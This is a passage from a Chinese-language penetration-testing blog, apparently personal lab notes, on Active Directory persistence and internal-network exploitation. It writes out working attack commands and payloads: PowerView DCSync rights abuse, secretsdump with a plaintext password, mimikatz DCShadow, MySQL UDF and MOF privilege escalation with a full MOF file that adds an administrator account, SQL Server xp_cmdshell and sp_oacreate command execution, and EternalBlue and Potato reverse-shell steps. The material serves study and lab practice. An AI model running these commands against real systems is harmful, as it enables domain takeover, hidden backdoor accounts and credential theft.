<p>导出域管理员Administrator用户的hash值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png"
                      alt="image-20230325165120864"
                ></p>
<h3 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h3><p>在获取域管理员权限之后，可以手动为域内标准用户赋予DCSync操作权限，从而实现隐蔽发域后门</p>
<p>通过powershell中的PowerView.ps1脚本实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">为域用户Alice添加DCSync权限</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure></div>

<p>添加成功后可以通过Alice用户导出域内用户的哈希</p>
<p><code>python3 secretsdump.py hack-my.com/administrator:Admin\!\@\#45@192.168.81.141 -just-dc-user &quot;hack-my\administrator&quot;</code></p>
<p>清除权限</p>
<p><code>Remove-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</code></p>
<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow技术同样利用了域控之间的DRS数据同步</p>
<p>但是它与DCSync思路相反</p>
<p>它是利用创建一个恶意的域控，利用域控之间的同步复制，将预先设定的对象和对象属性注入正在运行的合法域控中，以此来创建域后门等</p>
<p>通过DCShadow修改普通域用户Alice来演示攻击原理</p>
<p>前文已经知道，将用户的primaryGroupID改为512，可以然用户成为域管理员</p>
<p>RID是指相对标识符，时SID的一部分，通常在SID字符串的末端。</p>
<p>windows使用SID来区分用户账户和组的</p>
<h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>1.在任意注意中运行mimkatz并执行以下命令，创建恶意域控</p>
<p><code>mimikatz.exe &quot;lsadump::dcshadow /object:CN=Alice,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit</code></p>
<p>2.第一个命令窗口不要关，重新打开一个，强制触发域复制，将数据更改推送至合法域控制器</p>
<p><code>mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png"
                      alt="image-20230325173750046"
                ></p>
<p> 按理来说这时候Alice已经是域管理员组的用户了，但不知道为啥我成功不了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png"
                      alt="image-20230325175329381"
                ></p>
<p>DCShadow使得测试人员可以直接修改活动目录数据库中的对象</p>
<p>域防护比较严的情况下，可以利用DCShadow操控SID History、Krbtgt账户的密码，或者将用户添加到特权组，实现域权限持久化</p>
]]></content>
  </entry>
  <entry>
    <title>内网漏洞利用</title>
    <url>/2024/02/29/%E5%86%85%E7%BD%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="内网漏洞利用"><a href="#内网漏洞利用" class="headerlink" title="内网漏洞利用"></a>内网漏洞利用</h1><p>在内网中一般资产的数量是十分庞大的，所以避免迷失攻击的方向，需要有针对性的对内网的资产进行漏洞利用。</p>
<p>而前面所学的信息收集可以为内网漏洞的利用提供有力的条件支撑，利用这些漏洞是取得重要战果和定位靶标的关键。</p>
<h2 id="口令问题"><a href="#口令问题" class="headerlink" title="口令问题"></a>口令问题</h2><h3 id="弱口令-x2F-规律口令"><a href="#弱口令-x2F-规律口令" class="headerlink" title="弱口令&#x2F;规律口令"></a>弱口令&#x2F;规律口令</h3><p>一般来说弱口令是存在比较多的场景上的，在内网环境中也不乏有些弱口令或者说规律口令的发生</p>
<p>比如一般企业也会直接运用企业名或者缩写凭借简单的数字字符对其服务器进行设密，这些都是十分常见的</p>
<h3 id="口令复用"><a href="#口令复用" class="headerlink" title="口令复用"></a>口令复用</h3><p>在内网环境之中口令复用也是比较常见的，不同主机之间可能会运用相同的密码口令，我们可以利用一些手段或者工具对其进行探测，比如密码喷洒等，这样既不会造成次数过多锁定，也可以有效的探测内网环境。</p>
<h3 id="hash传递"><a href="#hash传递" class="headerlink" title="hash传递"></a>hash传递</h3><p>再Windows主机中，也可以利用手段获取一些主机的NTLM hash值，可以直接利用这些hash去获取到一些主机的权限</p>
<h3 id="Web-x2F-数据库-x2F-主机"><a href="#Web-x2F-数据库-x2F-主机" class="headerlink" title="Web&#x2F;数据库&#x2F;主机"></a>Web&#x2F;数据库&#x2F;主机</h3><p>在通过上一步的口令爆破之后，就可能可以拿到一些服务器的主机权限，就可以对其进行进一步的利用</p>
<h4 id="数据库权限"><a href="#数据库权限" class="headerlink" title="数据库权限"></a>数据库权限</h4><p>MSSQL、Oracle、Redis、Postgresql</p>
<p>如果获取到的是这些权限较低的数据库权限，我们就可以考虑对数据库进行提权的操作，进一步获取到主机&#x2F;系统权限</p>
<h5 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h5><h6 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h6><p>UDF叫做用户自定义函数，是通过添加新函数，实现MySQL中无法通过函数实现功能拓展，就是相当于MySQL中原生并没有内置这些函数，我们可以自己添加上去</p>
<p><strong>条件</strong></p>
<p>需要MySQL具有写入文件的权限：就是secure_file_priv的值为空</p>
<p>但我们获取到数据库权限之后，需要远程登陆的话就可以通过navicat连接，但是如果只允许本地连接的话就需要获取高权限来获得开启RDP远程登陆</p>
<p>通过更改MySQL的目录etc&#x2F;mysql&#x2F;my.conf，将bind-addrees&#x3D;127.0.0.1改成0.0.0.0即可</p>
<p>如果还有账号限制的话就可以创建一个账号，且配置允许任意IP登陆</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>

<p>MySQL提权之后所能达到的最大权限受限于所登入的账号的</p>
<p>可以先查看是否具有写入权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806163754135.png"
                      alt="image-20230806163754135"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secure_file_priv值为null 表示不允许导入导出</span><br><span class="line">secure_file_priv值为/tmp/，表示限制导入，导出只能在/tmp/目录下</span><br><span class="line">secure_file_priv值为空，则不限制</span><br></pre></td></tr></table></figure></div>

<p>要更改的话就在mysql目录中将my.ini在最后一行添加<code>secure_file_priv=&#39;&#39;</code>然后重启服务即可</p>
<p>接下来就需要上传我们的动态链接库</p>
<p>所谓的动态链接库文件就是一种实现共享函数库的一种方式，在Windows环境下后缀名为.dll，linux环境就是.so，文件包含执行系统命令的一些函数</p>
<p>这个文件在一些工具比如sqlmap、MSF中都有内置，但得上传与之相对应的版本UDF</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过这个参数查询系统版本</span><br><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806164346204.png"
                      alt="image-20230806164346204"
                ></p>
<p>由于我的MySQL服务器是64位windows系统所以上传这个</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806164526401.png"
                      alt="image-20230806164526401"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806164623731.png"
                      alt="image-20230806164623731"
                ></p>
<p>可以看出来文件是以.dll_ 结尾的，这是因为sqlmap为了不被系统所拦截做了特殊编码，需要解码，有自带脚本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806164815586.png"
                      alt="image-20230806164815586"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行即可</span><br><span class="line">python cloak.py -d -i lib_mysqludf_sys.dll_ -o udf.dll</span><br></pre></td></tr></table></figure></div>

<p>然后就可以上传了</p>
<p><strong>版本限制</strong></p>
<p>MySQL版本小于5.1</p>
<p>如果是win2000服务器，我们需要导入到C:\Winnt\udf.dll</p>
<p>如果是win2003服务器，我们需要导入到C:\Windows\udf.dll</p>
<p>MySQL版本大于5.1</p>
<p>udf.dll就必须放在MySQL安装目录的lib\plugin下（默认不存在需要自己创建）</p>
<p>我们的数据库版本大于5.1需要创建一个plugin文件夹，但是我们只是获得mysql权限，怎么在他的系统下创建文件夹</p>
<p>可以利用NTFS流进行创建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;E:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>但是报错了，自己本地创建一个吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806165529389.png"
                      alt="image-20230806165529389"
                ></p>
<p>导入进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:\\Windows\\System32\\cmd.exe\\lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;E:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin&#x27;;</span><br><span class="line"></span><br><span class="line">这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure></div>

<p>上传之后就可以创建自定义函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806170402105.png"
                      alt="image-20230806170402105"
                ></p>
<p>这是因为之前已经创建过该函数了</p>
<p>查看是否创建成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806170447467.png"
                      alt="image-20230806170447467"
                ></p>
<p>成功，然后就可以执行系统命令了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806171126285.png"
                      alt="image-20230806171126285"
                ></p>
<p>完成！</p>
<h6 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h6><p>MOF是windows系统的一个文件，位于c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof，他的中文名叫托管对象格式，作用是每五秒回去监控进程的创建和死亡</p>
<p>mof提权的主要原理就是拿到mysql权限之后，我们可以上传我们自己编写的mof文件并且执行，在上传过段时间之后mof就会被执行，其中有一段是vbs脚本，一般作用是利用cmd添加管理员的命令</p>
<p>所以这个提权方法并不局限于MySQL数据库，MySQL只是提供一个让我们在mof目录写入一个我们自己的文件的桥梁，其他能提供同样条件的也可以造成mof提权</p>
<p>前提已经拿到网站的shell，发现数据库</p>
<p>首先我们需要利用webshell工具把test.mof文件上传到www文件夹下</p>
<p>代码如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>还是得查看secure_file_priv的参数，看看mysql是否被允许导出文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure></div>

<p>是空就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806172104424.png"
                      alt="image-20230806172104424"
                ></p>
<p>接下来我们需要将在www文件夹下的test.mof文件导出至 C:\WINDOWS\system32\wbem\mof 下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;E:/phpstudy/phpstudy_pro/WWW/test.mof&#x27;) into dumpfile &#x27;C:/WINDOWS/system32/wbem/mof/test.mof&#x27;</span><br></pre></td></tr></table></figure></div>

<p>接下来只需要等待一段时间他就会自动执行了</p>
<p>一般来说mof文件夹中有bad和good文件夹，成功执行的会被放入good文件夹中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806172346235.png"
                      alt="image-20230806172346235"
                ></p>
<p>查询<code>net user</code>就知道它添加了一个管理员账户hacker了，提权成功</p>
<h5 id="SQLServer数据库"><a href="#SQLServer数据库" class="headerlink" title="SQLServer数据库"></a>SQLServer数据库</h5><p>SQL server提权主要依赖于自带的存储过程</p>
<p>而存储过程就是一个可编程的函数，他在数据库中创建并且保存，是存储在服务器中的一组编译过的T-SQL语句，我们可以将存储过程认为是函数调用过程，可以使用execute命令执行存储过程</p>
<p>主要分为系统存储过程，扩展存储过程，用户定义的存储过程</p>
<p>存储过程主要存储在master数据库中，以sp_为前缀，在任何数据库中都可以调用</p>
<p>扩展存储过程中主要是对动态链接库的（dll）函数调用，主要用于客户端于服务器端  或者客户端之间进行通信，以xp_为前缀</p>
<h6 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h6><p>xp_cmdshell是一个扩展存储过程</p>
<p>可以让系统管理员具有操作cmd的权限，并且以文本方式返回输出</p>
<p>xp_cmdshell在SQLserver2000中默认开启，可以直接执行系统命令</p>
<p>2005本身及之后的版本默认禁止，所以想要使用，就需要拥有SA账号相应权限，使用sp_configure将其开启。</p>
<p>所以我们要先判断是否是sa权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>返回1就是</p>
<p>还要判断xp_cmdshell是否存在，1就是存在，0就是不存在</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161347953.png"
                      alt="image-20230418161347953"
                ></p>
<p>如果是0的话，可以执行下列命令开启</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure></div>

<p>不开启的话执行命令会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161455586.png"
                      alt="image-20230418161455586"
                ></p>
<p>要关闭的话</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;exec sp_configure &#x27;xp_cmdshell&#x27;,0;RECONFIGURE;</span><br></pre></td></tr></table></figure></div>



<p>如果被删除可以通过xplog70.dll来恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure></div>



<p>但是…如果xplog70.dll也被删除了的也可以恢复，哈哈绝了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;;</span><br></pre></td></tr></table></figure></div>



<p>一切都配置好之后就可以通过xp_cmdshell来执行系统命令了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">或者</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161326688.png"
                      alt="image-20230418161326688"
                ></p>
<h6 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h6><p>当xp_cmdshell被删除的时候，就可以借助SQL server中的COM组件sp_oacreate来执行系统命令</p>
<p>原理是SQL server提供了一些函数访问OLE对象，sp_oacreate和sp_oamethod这两个可以调用OLE控件，间接来获取shell</p>
<p><strong>啥是OLE？</strong></p>
<p>OLE是一种面向对象的技术，是一个API接口，里面包含了可以重复使用的软件组件(COM)</p>
<p>要判断是否可以使用sp_oacreate执行系统命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163725677.png"
                      alt="image-20230418163725677"
                ></p>
<p>如果报错的话，没事，还可以使用以下命令打开</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163825197.png"
                      alt="image-20230418163825197"
                ></p>
<p>然后就可以执行命令了，但是它没有回显，所以得用txt文件的形式导出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\test.txt&#x27; </span><br></pre></td></tr></table></figure></div>

<p>执行whoami得出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418164047098.png"
                      alt="image-20230418164047098"
                ></p>
<h4 id="Web权限"><a href="#Web权限" class="headerlink" title="Web权限"></a>Web权限</h4><p>获取到文档协作平台、代码托管平台、集权管理平台</p>
<p>这些平台都是带有敏感的信息的获取到这些敏感平台是数据，可能就是我们突破的关键</p>
<h4 id="主机权限"><a href="#主机权限" class="headerlink" title="主机权限"></a>主机权限</h4><p>获取到一些如代码服务器、数据库服务器、集权平台服务器</p>
<p>或者通过hash传递的方式来获取一些运维&#x2F;研发&#x2F;行政人员的PC来窃取一些数据，为进一步横向打下信息基础</p>
<h2 id="系统漏洞"><a href="#系统漏洞" class="headerlink" title="系统漏洞"></a>系统漏洞</h2><h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>利用MSF连接并上线，进一步探测获取漏洞信息，然后利用获取主机高权限</p>
<p>msf内置exp直接利用</p>
<p>msf搜索ms17-010</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807100504648.png"
                      alt="image-20230807100504648"
                ></p>
<p>使用第一个exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807100538402.png"
                      alt="image-20230807100538402"
                ></p>
<p>配置目标的IP，执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807100606882.png"
                      alt="image-20230807100606882"
                ></p>
<p>exp利用成功</p>
<h4 id="fcstools"><a href="#fcstools" class="headerlink" title="fcstools"></a>fcstools</h4><p>该工具的实质就是替代了msf发送有害数据到靶机上并执行shellcode</p>
<h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p>先在kali上面生成一个x64.dll的后门，并且放到fcstools的根目录下，替换原有的文件x64</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807095601612.png"
                      alt="image-20230807095601612"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807095628142.png"
                      alt="image-20230807095628142"
                ></p>
<p>在kali开启msf监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807095750186.png"
                      alt="image-20230807095750186"
                ></p>
<p>然后打开工具执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807095935352.png"
                      alt="image-20230807095935352"
                ></p>
<p>success之后进入下一页面继续执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807095841952.png"
                      alt="image-20230807095841952"
                ></p>
<p>成功之后kali会收到反弹的shell，并且为system权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807100121016.png"
                      alt="image-20230807100121016"
                ></p>
<p>完成！</p>
<h4 id="fb-py"><a href="#fb-py" class="headerlink" title="fb.py"></a>fb.py</h4><h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3><p>利用土豆家族来进行提权</p>
<p>烂土豆、热土豆、甜土豆</p>
<p>一般使用频率最高的是甜土豆（SweetPotato），它可以说是集大成者，几乎可以适应各种环境</p>
<h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p>先将potato上传至目标主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806180451721.png"
                      alt="image-20230806180451721"
                ></p>
<p>然后kali必须确保MSF能反弹shell</p>
<p>先查看靶机的IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806183539825.png"
                      alt="image-20230806183539825"
                ></p>
<p>msf生成shell，然后上传靶机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806184427219.png"
                      alt="image-20230806184427219"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806184725820.png"
                      alt="image-20230806184725820"
                ></p>
<p>之后kali设置监听，靶机运行shell即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806184748516.png"
                      alt="image-20230806184748516"
                ></p>
<p>然后运行上传在靶机上面的potato</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806185136510.png"
                      alt="image-20230806185136510"
                ></p>
<p>令牌窃取，但是我这机子环境有问题土豆打不开，所以失败了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230806185236716.png"
                      alt="image-20230806185236716"
                ></p>
<p>正常是这样的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020212013343.png"
                      alt="image-20221020212013343"
                ></p>
<h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><p>SUID：主要原理是具有suid权限的文件，它在运行的时候不管是什么权限的用户运行都会以所有者的权限运行，所以通过寻找具有root权限所有的文件即可（nmap、vim、find、bash、more、less、nano和cp）</p>
<p>脏牛</p>
<p>SUDO</p>
<p>CVE-2021-3156</p>
<p>CVE-2021-4034</p>
<h2 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h2><h3 id="文档协作平台"><a href="#文档协作平台" class="headerlink" title="文档协作平台"></a>文档协作平台</h3><h4 id="Confluence"><a href="#Confluence" class="headerlink" title="Confluence"></a>Confluence</h4><p>存在CVE-2022-26134任意命令执行漏洞</p>
<p>可以利用开源工具，创建一个后门账号，然后进一步获取权限</p>
<h3 id="代码托管平台"><a href="#代码托管平台" class="headerlink" title="代码托管平台"></a>代码托管平台</h3><h4 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h4><p>侧重于获取一些代码的信息</p>
<p>CVE-2021-22205任意命令执行</p>
<p>如果目标是一个供应链上面两个平台是需要重点关注的，因为这些往往会泄露客户的VPN信息和当前公司的一些产品代码的信息</p>
<h3 id="OA办公系统"><a href="#OA办公系统" class="headerlink" title="OA办公系统"></a>OA办公系统</h3><p>通达</p>
<p>致远</p>
<p>泛微</p>
<h3 id="通用组件"><a href="#通用组件" class="headerlink" title="通用组件"></a>通用组件</h3><h6 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h6><p>是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器</p>
<p>存在反序列化漏洞、未授权访问漏洞、SSRF、弱口令</p>
<h6 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h6><p>框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理</p>
<p>他是基于cookie的反序列化漏洞，最具特征的是在返回包中会存在Rememberme&#x3D;deleteme</p>
<p>具有</p>
<p><strong>550</strong></p>
<p>原理：cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理</p>
